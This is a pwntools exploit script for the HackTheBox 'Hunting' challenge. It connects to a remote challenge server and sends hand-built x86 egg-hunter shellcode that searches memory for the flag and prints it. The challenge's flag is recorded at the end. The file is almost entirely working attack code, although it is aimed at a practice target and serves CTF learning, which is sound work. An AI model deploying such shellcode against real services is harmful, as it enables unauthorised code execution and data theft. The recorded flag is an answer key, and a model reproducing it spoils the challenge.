#solustions:
#https://shakuganz.com/2021/07/14/hackthebox-hunting-write-up/
#https://fdlucifer.github.io/2021/01/27/hunting/

#asm sample:
#https://asm.sourceforge.net/intro/hello.html

#system call parameters:
#https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit

#system call # in Linux:
#https://blog.51cto.com/hackedu/3403883

from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

#io = process('./hunting')
ip, port = '142.93.37.0', 30875
io = remote(ip, port)

'''
objdump -d sc|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
'''

#sc = '\x6a\x63\x5b\x6a\x1b\x58\xcd\x80\xba\xff\xff\xff\x5f\xbf\x48\x54\x42\x7b\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x61\x74\xea\x39\x3a\x75\xeb\x52\x59\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80'
sc = '\x6a\x63\x5b\x6a\x1b\x58\xcd\x80\xba\xff\xff\xff\x5f\xbf\x48\x54\x42\x7b\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x1a\x6a\x21\x58\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x52\x59\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80'
print len(sc)

io.sendline(sc)
print io.recvall()

#HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
